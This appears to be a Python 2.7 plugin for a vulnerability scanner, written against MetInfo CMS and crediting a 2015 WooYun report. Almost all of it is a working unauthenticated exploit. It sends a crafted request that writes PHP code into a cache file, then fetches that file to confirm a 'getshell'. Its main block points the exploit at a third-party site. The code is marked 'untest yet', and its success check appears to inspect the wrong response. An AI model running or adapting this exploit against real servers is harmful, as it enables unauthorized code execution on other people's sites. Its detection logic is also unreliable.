#!/usr/bin/python2.7
#coding:utf-8

import requests
from dummy import *

info = {
	'NAME':'MetInfo GETSHELL',
	'AUTHOR':'WJK,range',
	'TIME':'20150320',
	'WEB':'http://www.wooyun.org/bugs/wooyun-2015-094886',
	'DESCRIPTION':'MetInfo 无需登录前台直接GETSHELL'
}
opts = [
	['url','http://testasp.vulnweb.com','target url']
]

def Assign(services):
	if services.has_key('url') and services.has_key('cms') and services['cms']=='metinfo':
		return True
	return False

def Audit(services):
	url1 = services['url'] + '/admin/include/common.inc.php?met_admin_type_ok=1&langset=123&met_langadmin[123][]=12345&str=phpinfo%28%29%3B%3F%3E%2f%2f'
	url2 = services['url'] + '/cache/langadmin_123.php'
	try:
		rq1 = requests.get(url1)
		rq2 = requests.get(url2)
		if rq1.status_code == 200 and rq2.status_code == 200:
			if 'System'in rq1.text:
				security_hole(url2+'MetInfo 前台getshell')
			else:
				security_warning(url2 + 'MetInfo 前台getshell(maybe)')
	except:
		pass
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://www.eguan.cn'}
	pprint(Audit(services))
	pprint(services)
